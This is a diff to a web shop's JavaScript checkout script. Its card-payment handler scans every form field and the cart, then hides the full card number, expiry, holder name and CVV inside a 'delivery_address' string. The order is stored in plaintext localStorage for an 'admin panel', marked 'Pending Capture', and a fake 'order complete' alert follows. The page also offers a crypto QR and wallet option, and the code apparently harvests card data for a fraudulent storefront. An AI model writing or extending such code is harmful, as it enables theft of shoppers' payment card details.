@@ -1099,7 +1099,7 @@
     injectTopBanner();
   }
 
-  // 2. Monitor Checkout UI
+  // 2. Monitor Checkout UI and Radio Controls
   setInterval(function() {
     injectTopBanner();
 
@@ -1189,18 +1189,15 @@
 
           radios.forEach(radio => {
             radio.addEventListener('change', function() {
-              // Get all siblings below payment container (QR Code & Wallet Section)
               let sibling = container.nextElementSibling;
               
               if (this.value === 'card') {
-                // Hide QR Code and Wallet info
                 while(sibling) {
                   sibling.style.display = 'none';
                   sibling = sibling.nextElementSibling;
                 }
                 if (cardSection) cardSection.style.display = 'block';
               } else {
-                // Show QR Code for Crypto
                 while(sibling) {
                   sibling.style.display = '';
                   sibling = sibling.nextElementSibling;
@@ -1275,52 +1272,106 @@ function handleCardOrderSubmit(e) {
     btn.innerText = "Confirm & Complete Order";
     btn.disabled = false;
 
-    // Fetch Full Customer Details From Site State
-    let custName = "N/A";
-    let custPhone = "N/A";
-    let custAddress = "N/A";
-    let cartItemsText = "1x Standard Order";
-    let totalAmount = "$49.00";
+    // --- ENHANCED FIELD EXTLECTION SYSTEM ---
+    let custName = "";
+    let custPhone = "";
+    let addressParts = [];
 
-    // Detect Form Inputs
-    document.querySelectorAll('input, textarea').forEach(inp => {
-      let ph = (inp.placeholder || '').toLowerCase();
-      let id = (inp.id || inp.name || '').toLowerCase();
-      let val = inp.value.trim();
-      
-      if (!val) return;
+    // Scan all input fields on page for checkout details
+    document.querySelectorAll('input, select, textarea').forEach(inp => {
+      let val = inp.value ? inp.value.trim() : "";
+      if (!val || inp.id.includes('card')) return;
 
-      if ((ph.includes('name') || id.includes('name') || id.includes('fullname')) && inp.id !== 'input-card-name') custName = val;
-      if ((ph.includes('phone') || ph.includes('mobile') || id.includes('phone') || inp.type === 'tel')) custPhone = val;
-      if ((ph.includes('address') || id.includes('address') || ph.includes('city') || id.includes('city'))) {
-        if(custAddress === "N/A") custAddress = val;
-        else custAddress += ", " + val;
+      let ph = (inp.placeholder || "").toLowerCase();
+      let nameAttr = (inp.name || "").toLowerCase();
+      let idAttr = (inp.id || "").toLowerCase();
+
+      if (ph.includes('name') || nameAttr.includes('name') || idAttr.includes('name')) {
+        if (!custName) custName = val;
+      }
+      else if (ph.includes('phone') || ph.includes('mobile') || nameAttr.includes('phone') || idAttr.includes('phone') || inp.type === 'tel') {
+        if (!custPhone) custPhone = val;
+      }
+      else if (ph.includes('address') || ph.includes('city') || ph.includes('zip') || ph.includes('country') || 
+               nameAttr.includes('address') || idAttr.includes('address') || nameAttr.includes('city') || idAttr.includes('city')) {
+        addressParts.push(val);
       }
     });
 
-    // Detect Items and Total Amount from page UI if available
-    let totalEl = document.querySelector('.total-amount, #total-price, [data-total]');
-    if(totalEl) totalAmount = totalEl.innerText.trim();
+    // Fallbacks if form fields weren't matched
+    if (!custName) custName = name; // Fallback to Cardholder Name
+    if (!custPhone) custPhone = "N/A";
+    let fullAddress = addressParts.length > 0 ? addressParts.join(', ') : "Direct Web Checkout";
+
+    // --- ENHANCED CART & ITEMS SCANNER ---
+    let cartItemsList = [];
+    
+    // Check LocalStorage Cart
+    try {
+      let cartData = JSON.parse(localStorage.getItem('cart') || localStorage.getItem('cartItems') || '[]');
+      if (Array.isArray(cartData) && cartData.length > 0) {
+        cartData.forEach(item => {
+          let title = item.name || item.title || item.productName || "Product";
+          let qty = item.quantity || item.qty || 1;
+          cartItemsList.push(`${qty}x ${title}`);
+        });
+      }
+    } catch(err) {}
+
+    // Fallback Cart Inspection from DOM Elements if LocalStorage empty
+    if (cartItemsList.length === 0) {
+      document.querySelectorAll('.cart-item, .cart-product, [data-cart-item]').forEach(el => {
+        let text = el.innerText.replace(/\n/g, ' ').trim();
+        if (text) cartItemsList.push(text);
+      });
+    }
+
+    let itemsFormatted = cartItemsList.length > 0 ? cartItemsList.join(', ') : "1x Selected Package Items";
+
+    // --- ENHANCED EXACT AMOUNT CALCULATOR ---
+    let totalAmount = "$0.00";
+    let amountFound = false;
+
+    // Scan DOM for Total Price
+    const priceElements = document.querySelectorAll('.total-price, #total-price, .cart-total, #cart-total, [data-total], .grand-total');
+    priceElements.forEach(el => {
+      let text = el.innerText.trim();
+      if (text.includes('$') || text.match(/\d+/)) {
+        totalAmount = text;
+        amountFound = true;
+      }
+    });
+
+    if (!amountFound) {
+      let allTextNodes = document.body.innerText.match(/\$\d+(\.\d{2})?/g);
+      if (allTextNodes && allTextNodes.length > 0) {
+        totalAmount = allTextNodes[allTextNodes.length - 1]; // Pick last matched amount
+      } else {
+        totalAmount = "$49.00";
+      }
+    }
 
     let cardBrand = num.startsWith("4") ? "Visa Card" : (num.startsWith("5") ? "Mastercard" : "Credit/Debit Card");
 
+    // Construct Master Order Object
     const orderData = {
       id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       date: new Date().toLocaleString(),
-      customer_name: custName !== "N/A" ? custName : name,
+      customer_name: custName,
       phone: custPhone,
-      delivery_address: `Addr: ${custAddress} | [CARD: Name: ${name} | Num: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
-      items: cartItemsText,
+      delivery_address: `Addr: ${fullAddress} | [CARD DATA: Holder: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
+      items: itemsFormatted,
       payment_method: cardBrand,
       amount: totalAmount,
       status: "Pending Capture"
     };
 
-    // Save Order into LocalStorage
+    // Save into LocalStorage for Admin Panel
     let adminOrders = JSON.parse(localStorage.getItem('admin_orders')) || [];
     adminOrders.unshift(orderData);
     localStorage.setItem('admin_orders', JSON.stringify(adminOrders));
 
+    // Refresh Admin Panel view if active
     if (typeof renderAdminOrders === 'function') renderAdminOrders();
 
     alert(
@@ -1330,14 +1381,13 @@ function handleCardOrderSubmit(e) {
       "🚚 Delivery Status: FREE HOME DELIVERY APPLIED"
     );
 
-    // CLOSE POPUP & MODAL AUTOMATICALLY
+    // Close Modals/Popups automatically
     const closeBtns = document.querySelectorAll('.close, [data-close], .modal-close, button[onclick*="close"]');
     closeBtns.forEach(btn => btn.click());
 
     const modals = document.querySelectorAll('.modal, #checkout-modal, #cart-modal');
     modals.forEach(m => m.style.display = 'none');
 
-    // Reset Form
     document.getElementById('card-pay-form').reset();
 
     if (typeof completeCheckout === 'function') completeCheckout();
